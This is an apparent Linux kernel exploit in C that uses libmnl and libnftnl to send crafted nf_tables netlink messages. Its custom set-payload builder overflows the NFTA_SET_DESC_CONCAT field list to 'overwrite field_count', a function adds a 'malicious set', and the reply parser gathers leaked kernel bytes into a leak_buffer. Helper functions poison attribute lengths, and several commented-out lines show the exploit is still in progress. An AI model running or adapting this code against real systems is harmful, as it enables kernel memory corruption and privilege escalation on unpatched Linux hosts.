#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <stddef.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <errno.h>

#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>

#include <libmnl/libmnl.h>
#include <libnftnl/table.h>
#include <libnftnl/set.h>
#include <libnftnl/chain.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>

uint8_t leak_buffer[0x100];

void my_nftnl_set_nlmsg_build_payload(struct nlmsghdr *nlh, char * table_name, char * set_name)
{
	struct nlattr *nest1;
	struct nlattr *nest2;
	struct nlattr *nest_elem;
	int i;
	int num_exprs = 0;

	mnl_attr_put_strz(nlh, NFTA_SET_TABLE, table_name);
	mnl_attr_put_strz(nlh, NFTA_SET_NAME, set_name);
	mnl_attr_put_u32(nlh, NFTA_SET_KEY_TYPE, htonl(13));
	mnl_attr_put_u32(nlh, NFTA_SET_KEY_LEN, htonl(sizeof(uint16_t)));
	mnl_attr_put_u32(nlh, NFTA_SET_ID, htonl(1));

	nest1 = mnl_attr_nest_start(nlh, NFTA_SET_DESC);

	mnl_attr_put_u32(nlh, NFTA_SET_DESC_SIZE, htonl(20));

	nest2 = mnl_attr_nest_start(nlh, 2); // NFTA_SET_DESC_CONCAT
	for (i = 0; i < 16; i++) {
		nest_elem = mnl_attr_nest_start(nlh, NFTA_LIST_ELEM);
		mnl_attr_put_u32(nlh, 1, htonl(0x30+i)); // NFTA_SET_FIELD_LEN
		mnl_attr_nest_end(nlh, nest_elem);
	}

	// overwrite field_count
	nest_elem = mnl_attr_nest_start(nlh, NFTA_LIST_ELEM);
	mnl_attr_put_u32(nlh, 1, htonl(40)); // NFTA_SET_FIELD_LEN
	mnl_attr_nest_end(nlh, nest_elem);


	mnl_attr_nest_end(nlh, nest2);

	mnl_attr_nest_end(nlh, nest1);
}

void hexDump(char *desc, void *addr, int len) 
{
    int i;
    unsigned char buff[17];
    unsigned char *pc = (unsigned char*)addr;

    // Output description if given.
    if (desc != NULL)
        printf ("%s:\n", desc);

    // Process every byte in the data.
    for (i = 0; i < len; i++) {
        // Multiple of 16 means new line (with line offset).

        if ((i % 16) == 0) {
            // Just don't print ASCII for the zeroth line.
            if (i != 0)
                printf("  %s\n", buff);

            // Output the offset.
            printf("  %04x ", i);
        }

        // Now the hex code for the specific character.
        printf(" %02x", pc[i]);

        // And store a printable ASCII character for later.
        if ((pc[i] < 0x20) || (pc[i] > 0x7e)) {
            buff[i % 16] = '.';
        } else {
            buff[i % 16] = pc[i];
        }

        buff[(i % 16) + 1] = '\0';
    }

    // Pad out last line if not exactly 16 characters.
    while ((i % 16) != 0) {
        printf("   ");
        i++;
    }

    // And print the final ASCII bit.
    printf("  %s\n", buff);
}

void print_nla(struct nlattr * attr) {
	printf("nla_len : 0x%04x\n", attr->nla_len);
	printf("nla_type: 0x%04x\n", attr->nla_type);
	hexDump("data", (void *)attr, attr->nla_len);
}

void print_nlh(struct nlmsghdr * nlh)
{
	struct nlattr *attr;
	unsigned int offset;

	printf("nlmsg_len  : 0x%08x\n", nlh->nlmsg_len);
	printf("nlmsg_type : 0x%04x\n", nlh->nlmsg_type);
	printf("nlmsg_flags: 0x%04x\n", nlh->nlmsg_flags);
	printf("nlmsg_seq  : 0x%08x\n", nlh->nlmsg_seq);
	printf("nlmsg_pid  : 0x%08x\n", nlh->nlmsg_pid);
	printf("------------------------------------\n");

	attr = ((void *)nlh + sizeof(struct nlmsghdr));

	while(1) 
	{
		print_nla(attr);
		printf("------------------------------------\n");

		// nested nlh
		if (attr->nla_type == NFTA_SET_DESC) {
			printf("-------- PRINTING NFTA DESC --------\n");
			struct nlattr * ptr;

			// NFTA_SET_DESC_SIZE
			ptr = (void *)attr+4;
			print_nla(ptr);
			printf("------------------------------------\n");
			ptr = mnl_attr_next(ptr);

			// PRINT NFTA_LIST_ELEM
			uint16_t desc_len = ptr->nla_len-4;
			ptr = (void *)ptr+4;
			for (int i=0; i < desc_len; i+=ptr->nla_len) {
				printf("ELEM[%d]\n", i/0xc);
				print_nla((void *)ptr+i);
				leak_buffer[i/0xc] = *(uint8_t *)((void *)ptr+i+11);
				printf("------------------------------------\n");
			}
		}
		attr = mnl_attr_next(attr);
		
		if ((uint64_t)attr >= (uint64_t)((void *)nlh + nlh->nlmsg_len))
			break;
	}
	//hexDump("leak_buffer", leak_buffer, 40);
	return;
}
void poison_tb(struct nlmsghdr * nlh)
{
	printf("[*] try modifying field_len\n");

	const struct nlattr *attr;
	unsigned int offset;

	attr = ((void *)nlh + sizeof(struct nlmsghdr));

	while(1) 
	{
		printf("nla_len : 0x%04x\n", attr->nla_len);
		printf("nla_type: 0x%04x\n", attr->nla_type);
		if (attr->nla_len != 0x00d0 || attr->nla_type != 0x8009)
		{
			attr = mnl_attr_next(attr);
			continue;
		}

		*(uint16_t *)((void *)attr+0xc) = 0xc4+0xc;
		// *(uint32_t *)((void *)attr+0x1c-4) = 0xfcffffff;
		hexDump("malicious attr", (void *)attr, attr->nla_len);
		printf("------------------------------------\n");

		attr = mnl_attr_next(attr);
		
		if ((uint64_t)attr >= (uint64_t)((void *)nlh + nlh->nlmsg_len))
			break;
	}

	return;
}


void poison_field_len(struct nlmsghdr * nlh)
{
	printf("[*] try modifying field_len\n");

	const struct nlattr *attr;
	unsigned int offset;

	attr = ((void *)nlh + sizeof(struct nlmsghdr));

	while(1) 
	{
		printf("nla_len : 0x%04x\n", attr->nla_len);
		printf("nla_type: 0x%04x\n", attr->nla_type);
		if (attr->nla_len != 0x1c || attr->nla_type != 0x8009)
		{
			attr = mnl_attr_next(attr);
			continue;
		}

		*(uint32_t *)((void *)attr+0x1c-4) = 0xfcffffff;
		hexDump("malicious attr", (void *)attr, attr->nla_len);
		printf("------------------------------------\n");

		attr = mnl_attr_next(attr);
		
		if ((uint64_t)attr >= (uint64_t)((void *)nlh + nlh->nlmsg_len))
			break;
	}

	return;
}

static int parse_attr_cb(const struct nlattr *attr, void *data)
{
	int type = mnl_attr_get_type(attr);
	printf("type: 0x%x\n", type);
}

void send_batch(struct mnl_nlmsg_batch *batch, mnl_cb_t cb_data)
{
        struct mnl_socket *nl;
        char buf[MNL_SOCKET_BUFFER_SIZE];
        uint32_t portid;
        int ret, batching;

        nl = mnl_socket_open(NETLINK_NETFILTER);
        if (nl == NULL) {
                perror("mnl_socket_open");
                exit(EXIT_FAILURE);
        }

        if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
                perror("mnl_socket_bind");
                exit(EXIT_FAILURE);
        }
        portid = mnl_socket_get_portid(nl);

        if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                              mnl_nlmsg_batch_size(batch)) < 0) {
                perror("mnl_socket_send");
                exit(EXIT_FAILURE);
        }

        mnl_nlmsg_batch_stop(batch);

        ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
        while (ret > 0) {
                ret = mnl_cb_run(buf, ret, 0, portid, cb_data, NULL);
                if (ret <= 0)
                        break;
                ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
        }
        if (ret == -1) {
                perror("error");
                exit(EXIT_FAILURE);
        }
        mnl_socket_close(nl);
}

static struct nftnl_table *setup_table(uint32_t family, char * table_name)
{
        struct nftnl_table *t;

        t = nftnl_table_alloc();
        if (t == NULL) {
                perror("[!] Couldn't allocate a table");
                exit(EXIT_FAILURE);
        }

        nftnl_table_set_u32(t, NFTNL_TABLE_FAMILY, family);
        nftnl_table_set_str(t, NFTNL_TABLE_NAME, table_name);

        return t;
}

static struct nftnl_set *setup_set(uint32_t family, const char *table_name, const char *set_name)
{
	struct nftnl_set *s = NULL;

	s = nftnl_set_alloc();
	if (s == NULL) {
		perror("OOM");
		exit(EXIT_FAILURE);
	}

	nftnl_set_set_str(s, NFTNL_SET_TABLE, table_name);
	nftnl_set_set_str(s, NFTNL_SET_NAME, set_name);
	nftnl_set_set_u32(s, NFTNL_SET_FAMILY, family);
	nftnl_set_set_u32(s, NFTNL_SET_KEY_LEN, sizeof(uint16_t));
	/* inet service type, see nftables/include/datatypes.h */
	nftnl_set_set_u32(s, NFTNL_SET_KEY_TYPE, 13);
	nftnl_set_set_u32(s, NFTNL_SET_ID, 1);
	// NFTA_SET_DESC
	// NFTA_SET_DESC_SIZE
	// NFTA_SET_DESC_CONCAT
	// NFTA_SET_FIELD_LEN 
	// set NFTNL_SET_DESC_SIZE & NFTNL_SET_DESC_CONCAT == set NFTA_SET_DESC
	nftnl_set_set_u32(s, NFTNL_SET_DESC_SIZE, 20);

	nftnl_set_set_str(s, NFTNL_SET_DESC_CONCAT, "0000111122223333");
	
	/*
	for (int i=0; i<32; i++) {
		nftnl_set_set_u32(s, NFTNL_SET_DESC_CONCAT, i+0x30);
	}
	*/

	return s;
}

void add_table(uint32_t family, char *table_name){
        struct mnl_socket *nl;
        char buf[MNL_SOCKET_BUFFER_SIZE];
        struct nlmsghdr *nlh;
        uint32_t portid, seq, table_seq;
        struct nftnl_table *t;
        struct mnl_nlmsg_batch *batch;
        int ret;

        t = setup_table(family, table_name);
        if (t == NULL)
                exit(EXIT_FAILURE);

        seq = time(NULL);
        batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

        nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
        mnl_nlmsg_batch_next(batch);

        table_seq = seq;
        nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                    NFT_MSG_NEWTABLE, family,
                                    NLM_F_CREATE | NLM_F_ACK, seq++);
        nftnl_table_nlmsg_build_payload(nlh, t);
        nftnl_table_free(t);
        mnl_nlmsg_batch_next(batch);

        nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
        mnl_nlmsg_batch_next(batch);

        send_batch(batch, NULL);

        printf("[*] table added: %s\n", table_name);
        return;
}

void add_set(uint32_t family, char * table_name, char * set_name){
        struct mnl_socket *nl;
        char buf[MNL_SOCKET_BUFFER_SIZE];
        struct nlmsghdr *nlh;
        uint32_t portid, seq, set_seq;
        struct nftnl_set * s;
        struct mnl_nlmsg_batch *batch;
        int ret;

        s = setup_set(family, table_name, set_name);
        if (s == NULL)
                exit(EXIT_FAILURE);

        seq = time(NULL);
        batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

        nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
        mnl_nlmsg_batch_next(batch);

        set_seq = seq;
        nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                    NFT_MSG_NEWSET, family,
                                    NLM_F_CREATE | NLM_F_ACK, seq++);
        nftnl_set_nlmsg_build_payload(nlh, s);
	// print_nlh(nlh);
        nftnl_set_free(s);
        mnl_nlmsg_batch_next(batch);

        nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
        mnl_nlmsg_batch_next(batch);

        send_batch(batch, NULL);

        printf("[*] set added: %s\n", set_name);
        return;
}
void add_mal_set(uint32_t family, char * table_name, char * set_name){
        struct mnl_socket *nl;
        char buf[MNL_SOCKET_BUFFER_SIZE];
        struct nlmsghdr *nlh;
        uint32_t portid, seq, set_seq;
        struct nftnl_set * s;
        struct mnl_nlmsg_batch *batch;
        int ret;

        s = setup_set(family, table_name, set_name);
        if (s == NULL)
                exit(EXIT_FAILURE);

        seq = time(NULL);
        batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

        nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
        mnl_nlmsg_batch_next(batch);

        set_seq = seq;
        nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                    NFT_MSG_NEWSET, family,
                                    NLM_F_CREATE | NLM_F_ACK, seq++);
        //nftnl_set_nlmsg_build_payload(nlh, s);
        my_nftnl_set_nlmsg_build_payload(nlh, table_name, set_name);
	//print_nlh(nlh);
	// poison_tb(nlh);
	// poison_field_len(nlh);
        nftnl_set_free(s);
        mnl_nlmsg_batch_next(batch);

        nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
        mnl_nlmsg_batch_next(batch);

        send_batch(batch, NULL);

        printf("[*] malicious set added: %s\n", set_name);
        return;
}

static int set_cb(const struct nlmsghdr *nlh, void *data)
{
	struct nftnl_set *t;
	char buf[4096];
	uint32_t *type = data;

	printf("[+] getset callback\n");
	printf("nlh : %p\n", nlh);
	printf("data: %p\n", data);

	t = nftnl_set_alloc();
	if (t == NULL) {
		perror("OOM");
		goto err;
	}

	if (nftnl_set_nlmsg_parse(nlh, t) < 0) {
		perror("nftnl_set_nlmsg_parse");
		goto err_free;
	}
	print_nlh((struct nlmsghdr *)nlh);

	//nftnl_set_snprintf(buf, sizeof(buf), t, *type, 0);
	//printf("%s\n", buf);

err_free:
	// nftnl_set_free(t);
err:
	return MNL_CB_OK;
}

void get_set(uint32_t family){
        struct mnl_socket *nl;
        char buf[MNL_SOCKET_BUFFER_SIZE];
        struct nlmsghdr *nlh;
        uint32_t portid, seq, set_seq;
        struct nftnl_set * s;
        struct mnl_nlmsg_batch *batch;
        int ret;

	s = nftnl_set_alloc();
        if (s == NULL)
                exit(EXIT_FAILURE);

        seq = time(NULL);
        batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

        nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
        mnl_nlmsg_batch_next(batch);

        set_seq = seq;
	nlh = nftnl_nlmsg_build_hdr(buf, NFT_MSG_GETSET, family,
			    NLM_F_DUMP | NLM_F_ACK, seq);
        nftnl_set_nlmsg_build_payload(nlh, s);
        nftnl_set_free(s);

        send_batch(batch, set_cb);

	printf("[+] get_set\n");

        return;
}




/*
static int example_set_cb(const struct nlmsghdr *nlh, void *data)
{
	struct nftnl_set *t;
	char buf[4096];
	uint32_t *type = data;

	printf("[+] getset callback\n");
	printf("nlh : %p\n", nlh);
	printf("data: %p\n", data);

	t = nftnl_set_alloc();
	if (t == NULL) {
		perror("OOM");
		goto err;
	}

	if (nftnl_set_nlmsg_parse(nlh, t) < 0) {
		perror("nftnl_set_nlmsg_parse");
		goto err_free;
	}

	print_nlh(nlh);
	printf("end of print_nlh\n");
err_free:
	//nftnl_set_free(t);
	printf("free\n");
err:
	return MNL_CB_OK;
}

int example_getset(uint32_t family)
{
	struct mnl_socket *nl;
	char buf[MNL_SOCKET_BUFFER_SIZE];
	struct nlmsghdr *nlh;
	uint32_t portid, seq;
	uint32_t type = NFTNL_OUTPUT_DEFAULT;
	struct nftnl_set *t = NULL;
	int ret;

	t = nftnl_set_alloc();
	if (t == NULL) {
		perror("OOM");
		exit(EXIT_FAILURE);
	}
	seq = time(NULL);

	nlh = nftnl_nlmsg_build_hdr(buf, NFT_MSG_GETSET, family,
				    NLM_F_DUMP | NLM_F_ACK, seq);
	nftnl_set_nlmsg_build_payload(nlh, t);
	nftnl_set_free(t);

	nl = mnl_socket_open(NETLINK_NETFILTER);
	if (nl == NULL) {
		perror("mnl_socket_open");
		exit(EXIT_FAILURE);
	}

	if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
		perror("mnl_socket_bind");
		exit(EXIT_FAILURE);
	}
	portid = mnl_socket_get_portid(nl);

	if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0) {
		perror("mnl_socket_send");
		exit(EXIT_FAILURE);
	}

	ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
	printf("ret: %d\n", ret);
	while (ret > 0) {
		ret = mnl_cb_run(buf, ret, seq, portid, example_set_cb, &type);
		if (ret <= 0)
			break;
		ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
		printf("ret: %d\n", ret);
	}
	if (ret == -1) {
		perror("error");
		exit(EXIT_FAILURE);
	}
	mnl_socket_close(nl);

	return EXIT_SUCCESS;
}
*/
